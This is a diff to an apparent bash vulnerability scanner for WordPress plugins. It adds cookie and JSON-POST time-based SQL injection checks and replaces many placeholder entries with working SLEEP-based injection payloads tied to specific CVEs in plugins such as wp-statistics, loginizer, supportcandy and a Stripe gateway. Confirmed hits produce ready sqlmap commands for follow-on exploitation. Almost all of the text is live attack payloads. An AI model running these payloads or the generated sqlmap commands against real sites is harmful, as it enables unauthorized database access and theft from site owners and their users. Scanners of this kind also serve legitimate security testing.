@@ -160,6 +160,41 @@ check_time_post() {
     fi
 }
 
+# Cookie-based time injection: sends SLEEP payload in Cookie header
+check_time_cookie() {
+    local BASE_URL="$1" DOMAIN="$2" CVE="$3" PLUGIN="$4" ENDPOINT="$5" COOKIE="$6"
+    echo -e "\n${YELLOW}[${CVE}] plugin=${PLUGIN:-core} | Cookie time-based${NC}"
+    if [ -n "$PLUGIN" ] && ! plugin_check "$BASE_URL" "$PLUGIN"; then
+        echo -e "${RED}  Plugin not found${NC}"; return
+    fi
+    local DUR; DUR=$(time_check_h "${BASE_URL}${ENDPOINT}" GET "" "Cookie: ${COOKIE}")
+    if [ "$DUR" -ge "$THRESHOLD" ]; then
+        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "Cookie time-based sleep=${DUR}s" "sqli"
+        add_sqlmap "# ${CVE}: sqlmap -u '${BASE_URL}${ENDPOINT}' --cookie='${COOKIE}' --technique=T --dbms=MySQL --batch"
+    else
+        log_safe "$DOMAIN" "$CVE" "no delay (${DUR}s)"
+    fi
+}
+
+# JSON POST time-based: sends SLEEP payload as JSON body
+check_time_post_json() {
+    local BASE_URL="$1" DOMAIN="$2" CVE="$3" PLUGIN="$4" ENDPOINT="$5" BODY="$6"
+    echo -e "\n${YELLOW}[${CVE}] plugin=${PLUGIN:-core} | POST JSON time-based${NC}"
+    if [ -n "$PLUGIN" ] && ! plugin_check "$BASE_URL" "$PLUGIN"; then
+        echo -e "${RED}  Plugin not found${NC}"; return
+    fi
+    local START; START=$(date +%s)
+    curl -sk -A "$UA" -o /dev/null -m $((SLEEP_SEC+TIMEOUT)) -X POST \
+        -H "Content-Type: application/json" --data "$BODY" "${BASE_URL}${ENDPOINT}" 2>/dev/null || true
+    local DUR=$(( $(date +%s) - START ))
+    if [ "$DUR" -ge "$THRESHOLD" ]; then
+        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "POST JSON time-based sleep=${DUR}s" "sqli"
+        add_sqlmap "# ${CVE}: sqlmap -u '${BASE_URL}${ENDPOINT}' --data='${BODY}' --technique=T --dbms=MySQL --batch"
+    else
+        log_safe "$DOMAIN" "$CVE" "no delay (${DUR}s)"
+    fi
+}
+
 # Generic md5/union GET
 check_md5_get() {
     local BASE_URL="$1" DOMAIN="$2" CVE="$3" PLUGIN="$4" ENDPOINT="$5"
@@ -236,24 +271,24 @@ _check_CVE_2020_11530() { check_time_get "$1" "$2" 'CVE-2020-11530' 'chop-slider
 _check_CVE_2020_13640() { check_plugin_only "$1" "$2" 'CVE-2020-13640' 'wpdiscuz'; }
 _check_CVE_2020_14092() { check_plugin_only "$1" "$2" 'CVE-2020-14092' 'paypal-pro'; }
 _check_CVE_2020_27481() { check_time_post "$1" "$2" 'CVE-2020-27481' 'good-learning-management-system' '/wp-admin/admin-ajax.php' 'action=gdlr_lms_cancel_booking&id=(SELECT%201337%20FROM%20(SELECT(SLEEP(6)))MrMV)'; }
-_check_CVE_2020_27615() { check_time_get "$1" "$2" 'CVE-2020-27615' 'loginizer' '/wp-content/plugins/loginizer/readme.txt'; }
-_check_CVE_2020_5766() { check_time_get "$1" "$2" 'CVE-2020-5766' 'srs-simple-hits-counter' '/'; }
+_check_CVE_2020_27615() { check_time_post "$1" "$2" 'CVE-2020-27615' 'loginizer' '/wp-login.php' "log='%2cip%3dLEFT(UUID()%2c8)%2curl%3dif(1%3d1%2csleep(7)%2c0)%23&pwd=x&wp-submit=Login&redirect_to=&testcookie=1"; }
+_check_CVE_2020_5766() { check_plugin_only "$1" "$2" 'CVE-2020-5766' 'srs-simple-hits-counter'; }
 _check_CVE_2020_8772() { check_plugin_only "$1" "$2" 'CVE-2020-8772' 'iwp-client'; }
 _check_CVE_2021_24139() { check_time_get "$1" "$2" 'CVE-2021-24139' 'photo-gallery' '/index.php?rest_route=/wp/v2/pages'; }
 _check_CVE_2021_24285() { check_plugin_only "$1" "$2" 'CVE-2021-24285' 'cars-seller-auto-classifieds-script'; }
 _check_CVE_2021_24295() { check_plugin_only "$1" "$2" 'CVE-2021-24295' 'cleantalk-spam-protect'; }
-_check_CVE_2021_24340() { check_time_get "$1" "$2" 'CVE-2021-24340' 'wp-statistics' '/wp-content/plugins/wp-statistics/readme.txt'; }
+_check_CVE_2021_24340() { check_time_get "$1" "$2" 'CVE-2021-24340' 'wp-statistics' '/wp-admin/admin.php?page=wps_pages_page&ID=0+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))test)&type=home'; }
 _check_CVE_2021_24442() { check_time_post "$1" "$2" 'CVE-2021-24442' 'polls-widget' '/wp-admin/admin-ajax.php?action=pollinsertvalues' 'question_id=1&poll_answer_securety=8df73ed4ee&date_answers%5B0%5D=SLEEP(5)'; }
 _check_CVE_2021_24554() { check_plugin_only "$1" "$2" 'CVE-2021-24554' 'paytm-pay'; }
 _check_CVE_2021_24627() { check_plugin_only "$1" "$2" 'CVE-2021-24627' 'g-auto-hyperlink'; }
 _check_CVE_2021_24666() { check_md5_get "$1" "$2" 'CVE-2021-24666' 'podlove-podcast-publisher' '/index.php?rest_route=/podlove/v1/social/services/contributor/1&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,md5('; }
-_check_CVE_2021_24731() { check_time_post "$1" "$2" 'CVE-2021-24731' 'pie-register' '/wp-json/pie/v1/login' 'user_login='\''+AND+(SELECT+8149+FROM+(SELECT(SLEEP(3)))NuqO)+AND+'\''YvuB'\''='\''YvuB&login_pass=a'; }
+_check_CVE_2021_24731() { check_time_post "$1" "$2" 'CVE-2021-24731' 'pie-register' '/wp-json/pie/v1/login' 'user_login='\''+AND+(SELECT+8149+FROM+(SELECT(SLEEP(7)))NuqO)+AND+'\''YvuB'\''='\''YvuB&login_pass=a'; }
 _check_CVE_2021_24750() { check_plugin_only "$1" "$2" 'CVE-2021-24750' 'wp_visitor_statistics_\(real_time_traffic\)'; }
 _check_CVE_2021_24762() { check_time_get "$1" "$2" 'CVE-2021-24762' 'perfect-survey' '/wp-admin/admin-ajax.php?action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(7)))HQYx)'; }
 _check_CVE_2021_24786() { check_plugin_only "$1" "$2" 'CVE-2021-24786' 'download-monitor'; }
 _check_CVE_2021_24791() { check_plugin_only "$1" "$2" 'CVE-2021-24791' 'header-footer-code-manager'; }
 _check_CVE_2021_24827() { check_time_get "$1" "$2" 'CVE-2021-24827' 'asgaros-forum' '/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(6)'; }
-_check_CVE_2021_24849() { check_time_get "$1" "$2" 'CVE-2021-24849' 'wc-multivendor-marketplace' '/wp-content/plugins/wc-multivendor-marketplace/readme.txt'; }
+_check_CVE_2021_24849() { check_time_post "$1" "$2" 'CVE-2021-24849' 'wc-multivendor-marketplace' '/wp-admin/admin-ajax.php' 'action=wcfm_ajax_controller&controller=wcfm-refund-requests&transaction_id=1+union+select+1+and+sleep(6)--'; }
 _check_CVE_2021_24862() { check_plugin_only "$1" "$2" 'CVE-2021-24862' 'registrationmagic'; }
 _check_CVE_2021_24915() { check_plugin_only "$1" "$2" 'CVE-2021-24915' 'contest-gallery'; }
 _check_CVE_2021_24931() { check_time_get "$1" "$2" 'CVE-2021-24931' 'secure-copy-content-protection-and-content-locking' '/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20AND%20(SELECT%205921%20FROM%20(SELECT(SLEEP(6)))LxjM)%20AND%20(7754=775&type=json'; }
@@ -269,7 +304,7 @@ _check_CVE_2022_0434() { check_md5_get "$1" "$2" 'CVE-2022-0434' 'page-view-coun
 _check_CVE_2022_0439() { check_plugin_only "$1" "$2" 'CVE-2022-0439' ''; }
 _check_CVE_2022_0479() { check_plugin_only "$1" "$2" 'CVE-2022-0479' 'popup-builder'; }
 _check_CVE_2022_0592() { check_time_get "$1" "$2" 'CVE-2022-0592' 'mapsvg' '/wp-json/mapsvg/v1/maps/2?id=1%27%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(6)))b)--+'; }
-_check_CVE_2022_0651() { check_time_get "$1" "$2" 'CVE-2022-0651' 'wp-statistics' '/'; }
+_check_CVE_2022_0651() { check_plugin_only "$1" "$2" 'CVE-2022-0651' 'wp-statistics'; }
 _check_CVE_2022_0658() { check_time_post "$1" "$2" 'CVE-2022-0658' 'commonsbooking' '/wp-admin/admin-ajax.php' 'action=calendar_data&sd=2099-02-13&ed=2099-02-13&item=1&location=(SELECT+1743+FROM+(SELECT(SLEEP(6)))iXxL3)'; }
 _check_CVE_2022_0693() { check_time_get "$1" "$2" 'CVE-2022-0693' 'master-elements' '/wp-admin/admin-ajax.php?meta_ids=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&action=remove_post_meta_condition'; }
 _check_CVE_2022_0747() { check_time_post "$1" "$2" 'CVE-2022-0747' 'infographic-maker' '/wp-admin/admin-ajax.php' 'action=qcld_upvote_action&post_id=1+AND+(SELECT+1626+FROM+(SELECT(SLEEP(6)))niPH)'; }
@@ -297,8 +332,8 @@ _check_CVE_2022_1453() { check_time_get "$1" "$2" 'CVE-2022-1453' 'rsvpmaker' '/
 _check_CVE_2022_1768() { check_time_post "$1" "$2" 'CVE-2022-1768' 'rsvpmaker' '/wp-json/rsvpmaker/v1/stripesuccess/anythinghere' 'rsvp_id=(select(0)from(select(sleep(7)))a)&amount=1234&email=randomtext'; }
 _check_CVE_2022_1950() { check_time_post "$1" "$2" 'CVE-2022-1950' 'youzify' '/wp-admin/admin-ajax.php' 'action=youzify_media_pagination&data[type]=photos&page=1&data[group_id]=(SELECT 7958 FROM (SELECT(SLEEP(6)))XVfJ)'; }
 _check_CVE_2022_21661() { check_plugin_only "$1" "$2" 'CVE-2022-21661' 'wordpress'; }
-_check_CVE_2022_25148() { check_time_get "$1" "$2" 'CVE-2022-25148' 'wp-statistics' '/'; }
-_check_CVE_2022_25149() { check_time_get "$1" "$2" 'CVE-2022-25149' 'wp-statistics' '/'; }
+_check_CVE_2022_25148() { check_plugin_only "$1" "$2" 'CVE-2022-25148' 'wp-statistics'; }
+_check_CVE_2022_25149() { check_plugin_only "$1" "$2" 'CVE-2022-25149' 'wp-statistics'; }
 _check_CVE_2022_3142() { check_plugin_only "$1" "$2" 'CVE-2022-3142' 'nex-forms-express-wp-form-builder'; }
 _check_CVE_2022_3254() { check_plugin_only "$1" "$2" 'CVE-2022-3254' ''; }
 _check_CVE_2022_33965() { check_time_get "$1" "$2" 'CVE-2022-33965' 'wp-stats-manager' '/?wmcAction=wmcTrack&url=test&uid=0&pid=0&visitorId=1331'\''+and+sleep(7)+or+'\'''; }
@@ -314,20 +349,20 @@ _check_CVE_2022_45805() { check_plugin_only "$1" "$2" 'CVE-2022-45805' 'payment-
 _check_CVE_2022_45808() { check_time_post "$1" "$2" 'CVE-2022-45808' 'learnpress' '/wp-json/lp/v1/courses/archive-course' 'c_search=X&order_by=ID AND (SELECT 1471 FROM (SELECT(SLEEP(6)))VcSO)&order=DESC&limit=10&return_type=html'; }
 _check_CVE_2023_0037() { check_time_post "$1" "$2" 'CVE-2023-0037' 'map-builder-for-google-maps' '/' 'radius=1+and+(SELECT+7741+FROM+(SELECT(SLEEP(7)))hlAf)&lat=0.0&lng=0.0&distance_in=km'; }
 _check_CVE_2023_0261() { check_plugin_only "$1" "$2" 'CVE-2023-0261' 'wp-tripadvisor-review-slider'; }
-_check_CVE_2023_0600() { check_time_get "$1" "$2" 'CVE-2023-0600' 'wp-stats-manager' '/wp-content/plugins/wp-statistics/readme.txt'; }
+_check_CVE_2023_0600() { check_time_get "$1" "$2" 'CVE-2023-0600' 'wp-stats-manager' '/?wmcAction=wmcTrack&siteId=34&url=test&uid=01&pid=02&visitorId=x%27,sleep(7),0,0,0,0,0);--+-'; }
 _check_CVE_2023_0630() { check_plugin_only "$1" "$2" 'CVE-2023-0630' 'slimstat-analytics'; }
 _check_CVE_2023_0900() { check_plugin_only "$1" "$2" 'CVE-2023-0900' 'ap-pricing-tables-lite'; }
 _check_CVE_2023_1020() { check_plugin_only "$1" "$2" 'CVE-2023-1020' 'wp-live-chat-shoutbox'; }
 _check_CVE_2023_1408() { check_plugin_only "$1" "$2" 'CVE-2023-1408' 'video-list-manager'; }
-_check_CVE_2023_1730() { check_time_get "$1" "$2" 'CVE-2023-1730' 'supportcandy' '/'; }
+_check_CVE_2023_1730() { check_time_cookie "$1" "$2" 'CVE-2023-1730' 'supportcandy' '/' 'wpsc_guest_login_auth={"email":"'\'' AND (SELECT 42 FROM (SELECT(SLEEP(7)))NNTu)-- cLmu"}'; }
 _check_CVE_2023_23488() { check_time_get "$1" "$2" 'CVE-2023-23488' 'paid-memberships-pro' '/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(7)))a)--%20-'; }
 _check_CVE_2023_23489() { check_time_get "$1" "$2" 'CVE-2023-23489' 'easy-digital-downloads' '/wp-admin/admin-ajax.php?action=edd_download_search&s=1'\''+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-'; }
 _check_CVE_2023_24000() { check_time_get "$1" "$2" 'CVE-2023-24000' 'gamipress' '/wp-json/wp/v2/gamipress-logs?trigger_type[]=test'\'')%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(6)))x)%20AND%20('\''a'\''='\''a'; }
 _check_CVE_2023_2437() { check_plugin_only "$1" "$2" 'CVE-2023-2437' 'userpro'; }
 _check_CVE_2023_2449() { check_plugin_only "$1" "$2" 'CVE-2023-2449' 'userpro'; }
 _check_CVE_2023_28121() { check_plugin_only "$1" "$2" 'CVE-2023-28121' 'woocommerce-payments'; }
-_check_CVE_2023_28662() { check_time_get "$1" "$2" 'CVE-2023-28662' 'gift-voucher' '/wp-content/plugins/gift-voucher/readme.txt'; }
-_check_CVE_2023_28787() { check_time_get "$1" "$2" 'CVE-2023-28787' '' '/'; }
+_check_CVE_2023_28662() { check_time_post "$1" "$2" 'CVE-2023-28662' 'gift-voucher' '/wp-admin/admin-ajax.php' 'action=wpgv_doajax_voucher_pdf_save_func&template=LTEgT1IgU0xFRVAoNik='; }
+_check_CVE_2023_28787() { check_time_cookie "$1" "$2" 'CVE-2023-28787' 'quiz-master-next' '/' 'question_ids_1=1) AND SLEEP(8)-- -'; }
 _check_CVE_2023_3076() { check_plugin_only "$1" "$2" 'CVE-2023-3076' 'mstore-api'; }
 _check_CVE_2023_3077() { check_time_get "$1" "$2" 'CVE-2023-3077' 'mstore-api' '/wp-json/api/flutter_booking/get_staffs?product_id=%27+or+ID=sleep(6)--+-'; }
 _check_CVE_2023_3197() { check_time_get "$1" "$2" 'CVE-2023-3197' 'flutter-woocommerce-app' '/wp-json/api/flutter_multi_vendor/product-categories'; }
@@ -342,19 +377,19 @@ _check_CVE_2023_5652() { check_time_post "$1" "$2" 'CVE-2023-5652' 'wp-hotel-boo
 _check_CVE_2023_6009() { check_plugin_only "$1" "$2" 'CVE-2023-6009' 'userpro'; }
 _check_CVE_2023_6030() { check_time_get "$1" "$2" 'CVE-2023-6030' 'logdash-activity-log' '/wp-content/plugins/logdash-activity-log/README.txt'; }
 _check_CVE_2023_6063() { check_time_get "$1" "$2" 'CVE-2023-6063' 'wp-fastest-cache' '/wp-login.php'; }
-_check_CVE_2023_6360() { check_time_get "$1" "$2" 'CVE-2023-6360' 'my-calendar' '/wp-content/plugins/my-calendar/readme.txt'; }
+_check_CVE_2023_6360() { check_time_get "$1" "$2" 'CVE-2023-6360' 'my-calendar' '/?rest_route=/my-calendar/v1/events&from=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))a)+AND+%27a%27%3d%27a'; }
 _check_CVE_2023_6567() { check_time_get "$1" "$2" 'CVE-2023-6567' 'learnpress' '/wp-json/lp/v1/courses/archive-course?&order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1'; }
 _check_CVE_2023_7337() { check_plugin_only "$1" "$2" 'CVE-2023-7337' ''; }
-_check_CVE_2024_0705() { check_time_get "$1" "$2" 'CVE-2024-0705' 'payment-gateway-stripe-and-woocommerce-integration' '/'; }
+_check_CVE_2024_0705() { check_time_post_json "$1" "$2" 'CVE-2024-0705' 'payment-gateway-stripe-and-woocommerce-integration' '/?wc-api=wt_stripe' '{"type":"charge.succeeded","data":{"object":{"id":"x AND (SELECT 1 FROM (SELECT SLEEP(7))a)#","metadata":{"order_id":"999999"}}}}'; }
 _check_CVE_2024_10400() { check_md5_get "$1" "$2" 'CVE-2024-10400' 'tutor' '/wp-admin/admin-ajax.php'; }
 _check_CVE_2024_1061() { check_time_get "$1" "$2" 'CVE-2024-1061' 'html5-video-player' '/?rest_route=/h5vp/v1/view/1&id=1'\''+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-'; }
 _check_CVE_2024_1071() { check_time_get "$1" "$2" 'CVE-2024-1071' 'ultimate-member' '/?p=1'; }
 _check_CVE_2024_10924() { check_plugin_only "$1" "$2" 'CVE-2024-10924' 'really-simple-ssl'; }
-_check_CVE_2024_11728() { check_time_get "$1" "$2" 'CVE-2024-11728' 'kivicare-clinic-management-system' '/'; }
+_check_CVE_2024_11728() { check_plugin_only "$1" "$2" 'CVE-2024-11728' 'kivicare-clinic-management-system'; }
 _check_CVE_2024_12025() { check_time_get "$1" "$2" 'CVE-2024-12025' 'collapsing-categories' '/wp-json/collapsing-categories/v1/get?showPosts=1&taxonomy=category%27%29+AND+(SELECT+1+FROM+(SELECT(SLEEP(8)))a)--+-'; }
 _check_CVE_2024_13322() { check_time_post "$1" "$2" 'CVE-2024-13322' 'ap-plugin-scripteo' '/wp-admin/admin-ajax.php' 'action=bsa_stats_chart_callback&ad_id=1+and+(select*from(select(sleep(0.7)))a)-- -'; }
-_check_CVE_2024_13496() { check_time_get "$1" "$2" 'CVE-2024-13496' 'gamipress' '/'; }
-_check_CVE_2024_13726() { check_time_get "$1" "$2" 'CVE-2024-13726' 'tc-ecommerce' '/'; }
+_check_CVE_2024_13496() { check_plugin_only "$1" "$2" 'CVE-2024-13496' 'gamipress'; }
+_check_CVE_2024_13726() { check_time_get "$1" "$2" 'CVE-2024-13726' 'tc-ecommerce' '/mobile-checkout/?order_id=(select*from(select(sleep(6)))a)'; }
 _check_CVE_2024_1512() { check_time_get "$1" "$2" 'CVE-2024-1512' 'masterstudy-lms-learning-management-system' '/?rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%286%29%29%29sauT%29+AND+%283071%3D3071'; }
 _check_CVE_2024_1698() { check_time_post "$1" "$2" 'CVE-2024-1698' 'notificationx' '/wp-json/notificationx/v1/analytics' '{"nx_id": "1","type": "clicks\`=1 and 1=sleep(5)-- -"}'; }
 _check_CVE_2024_1751() { check_time_get "$1" "$2" 'CVE-2024-1751' 'tutor' '/courses/'; }
@@ -368,33 +403,33 @@ _check_CVE_2024_30502() { check_time_get "$1" "$2" 'CVE-2024-30502' 'wp-travel-e
 _check_CVE_2024_32128() { check_time_get "$1" "$2" 'CVE-2024-32128' 'real-estate-listing-realtyna-wpl' '/?wpl_format=f:property_listing:ajax&wpl_function=get_total_results&sf_tmin_price=1'; }
 _check_CVE_2024_32709() { check_md5_get "$1" "$2" 'CVE-2024-32709' 'wp-recall' '/account/?user=1&tab=groups&group-name=p%27+or+%27%%27=%27%%27+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat(%22Database:%22,md5({{num}}),0x7c,%20%22Version:%22,version()),13--+-'; }
 _check_CVE_2024_3495() { check_md5_get "$1" "$2" 'CVE-2024-3495' 'country-state-city-auto-dropdown' '/'; }
-_check_CVE_2024_3552() { check_time_get "$1" "$2" 'CVE-2024-3552' 'web-directory-free' '/'; }
+_check_CVE_2024_3552() { check_time_post "$1" "$2" 'CVE-2024-3552' 'web-directory-free' '/wp-admin/admin-ajax.php' 'action=w2dc_get_map_marker_info&locations_ids[]=(select+if(1=1,sleep(6),0)+from+(select+1)x)'; }
 _check_CVE_2024_35700() { check_plugin_only "$1" "$2" 'CVE-2024-35700' 'userpro'; }
 _check_CVE_2024_3605() { check_plugin_only "$1" "$2" 'CVE-2024-3605' ''; }
 _check_CVE_2024_3922() { check_time_get "$1" "$2" 'CVE-2024-3922' 'dokan-pro' '/wp-content/plugins/dokan-pro/changelog.txt'; }
-_check_CVE_2024_4295() { check_time_get "$1" "$2" 'CVE-2024-4295' 'email-subscribers' '/wp-content/plugins/email-subscribers/readme.txt'; }
+_check_CVE_2024_4295() { check_plugin_only "$1" "$2" 'CVE-2024-4295' 'email-subscribers'; }
 _check_CVE_2024_43917() { check_time_get "$1" "$2" 'CVE-2024-43917' 'ti-woocommerce-wishlist' '/?p=1'; }
 _check_CVE_2024_43965() { check_plugin_only "$1" "$2" 'CVE-2024-43965' ''; }
-_check_CVE_2024_4434() { check_time_get "$1" "$2" 'CVE-2024-4434' 'learnpress' '/'; }
+_check_CVE_2024_4434() { check_plugin_only "$1" "$2" 'CVE-2024-4434' 'learnpress'; }
 _check_CVE_2024_4443() { check_time_post "$1" "$2" 'CVE-2024-4443' 'business-directory-plugin' '/business-directory/?dosrch=1&q=&wpbdp_view=search&listingfields[+or+sleep(if(1%3d1,6,0))+))--+-][1]=' 'matchers:'; }
 _check_CVE_2024_5057() { check_time_get "$1" "$2" 'CVE-2024-5057' 'easy-digital-downloads' '/wp-admin/admin-ajax.php?action=edd_download_search&s=a'\'')/**/AND/**/SLEEP(6)%23'; }
 _check_CVE_2024_5522() { check_md5_get "$1" "$2" 'CVE-2024-5522' 'html5-video-player' '/wp-json/h5vp/v1/video/0?id='; }
-_check_CVE_2024_5765() { check_time_get "$1" "$2" 'CVE-2024-5765' 'wpstickybar-sticky-bar-sticky-header' '/'; }
+_check_CVE_2024_5765() { check_time_post "$1" "$2" 'CVE-2024-5765' 'wpstickybar-sticky-bar-sticky-header' '/wp-admin/admin-ajax.php' 'action=stickybar_display&banner_id=1%20AND%20SLEEP(6);'; }
 _check_CVE_2024_5975() { check_time_get "$1" "$2" 'CVE-2024-5975' 'cz-loan-management' '/wp-content/plugins/cz-loan-management/README.txt'; }
 _check_CVE_2024_6028() { check_time_post "$1" "$2" 'CVE-2024-6028' 'quiz-maker' '/wp-admin/admin-ajax.php' 'ays_quiz_id=1&ays_quiz_questions=1,2,3&quiz_id=1&ays_questions[ays-question-4)+or+sleep(if(1>0,6,0)]=&action=ays_finish_quiz'; }
-_check_CVE_2024_6159() { check_time_get "$1" "$2" 'CVE-2024-6159' 'push-notification-for-post-and-buddypress' '/'; }
+_check_CVE_2024_6159() { check_time_post "$1" "$2" 'CVE-2024-6159' 'push-notification-for-post-and-buddypress' '/wp-admin/admin-ajax.php' 'action=icpushcallback&onesignal_externalid=1+AND+SLEEP(6)&pushtype=onesignal_subscribed_users'; }
 _check_CVE_2024_6205() { check_time_get "$1" "$2" 'CVE-2024-6205' 'payplus-payment-gateway' '/?wc-api=payplus_gateway&status_code=true&more_info=(select*from(select(sleep(6)))a)'; }
 _check_CVE_2024_6265() { check_time_get "$1" "$2" 'CVE-2024-6265' '' '{{path}}?uwp_sort_by=display_name,(SELECT+SLEEP(6))_asc'; }
-_check_CVE_2024_6924() { check_time_get "$1" "$2" 'CVE-2024-6924' 'truebooker-appointment-booking' '/'; }
-_check_CVE_2024_6926() { check_time_get "$1" "$2" 'CVE-2024-6926' 'viral-signup' '/'; }
-_check_CVE_2024_6928() { check_time_get "$1" "$2" 'CVE-2024-6928' 'opti-marketing' '/'; }
-_check_CVE_2024_7854() { check_time_get "$1" "$2" 'CVE-2024-7854' 'woo-inquiry' '/'; }
-_check_CVE_2024_8484() { check_time_get "$1" "$2" 'CVE-2024-8484' 'rest-api-to-miniprogram' '/'; }
+_check_CVE_2024_6924() { check_time_post "$1" "$2" 'CVE-2024-6924' 'truebooker-appointment-booking' '/wp-content/plugins/truebooker-appointment-booking/main/truebooker-service-price.php' 'tba_service_id=(SLEEP(6))'; }
+_check_CVE_2024_6926() { check_time_post "$1" "$2" 'CVE-2024-6926' 'viral-signup' '/wp-admin/admin-ajax.php' 'action=wow_signup_send_free&idsignup=(select*from(select(sleep(6)))a)'; }
+_check_CVE_2024_6928() { check_time_post "$1" "$2" 'CVE-2024-6928' 'opti-marketing' '/wp-admin/admin-ajax.php' 'action=save_article&postId=(select*from(select(sleep(6)))a)'; }
+_check_CVE_2024_7854() { check_time_post "$1" "$2" 'CVE-2024-7854' 'woo-inquiry' '/wp-admin/admin-ajax.php' 'action=woo_wpinq_times_up&dbid=(SELECT(0)FROM(SELECT(SLEEP(6)))a)'; }
+_check_CVE_2024_8484() { check_time_get "$1" "$2" 'CVE-2024-8484' 'rest-api-to-miniprogram' '/wp-json/watch-life-net/v1/comment/getcomments?order=DESC,(SELECT(1)FROM(SELECT(SLEEP(6)))a)--&postid=3&limit=1&page=1'; }
 _check_CVE_2024_8522() { check_time_get "$1" "$2" 'CVE-2024-8522' 'learnpress' '/wp-json/learnpress/v1/courses?course_filter=&c_only_fields=post_title,(select(sleep(6))),ID&'; }
 _check_CVE_2024_8529() { check_time_get "$1" "$2" 'CVE-2024-8529' 'learnpress' '/wp-json/learnpress/v1/courses?c_fields=(SELECT(0)FROM(SELECT(SLEEP(6)))a)'; }
 _check_CVE_2024_8625() { check_plugin_only "$1" "$2" 'CVE-2024-8625' 'ts-poll'; }
 _check_CVE_2024_8911() { check_time_post "$1" "$2" 'CVE-2024-8911' 'latepoint' '/wp-admin/admin-ajax.php' 'action=latepoint_route_call&route_name=customer_cabinet__change_password&params=password_reset_token%5bOR%5d%5b%20IS%20NULL%20or%20not%20(select%20sleep(8)))%20limit%201%3b--%20-%5d%3d{{randstr}}%26pa'; }
-_check_CVE_2024_9186() { check_time_get "$1" "$2" 'CVE-2024-9186' 'wp-marketing-automations' '/'; }
+_check_CVE_2024_9186() { check_time_get "$1" "$2" 'CVE-2024-9186' 'wp-marketing-automations' '/?bwfan-track-id=test%27+UNION+SELECT+1,1,sleep(7)%23&bwfan-track-action=click'; }
 _check_CVE_2024_9796() { check_plugin_only "$1" "$2" 'CVE-2024-9796' 'wp-advanced-search'; }
 _check_CVE_2024_9863() { check_plugin_only "$1" "$2" 'CVE-2024-9863' 'userpro'; }
 _check_CVE_2025_13138() { check_time_post "$1" "$2" 'CVE-2025-13138' 'wpdirectorykit' '/wp-admin/admin-ajax.php' 'action=wdk_public_action&page=wdk_frontendajax&function=select_2_ajax&table=category_m&columns_search=category_title)%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(7)))a)--%20-&q[term]=test'; }
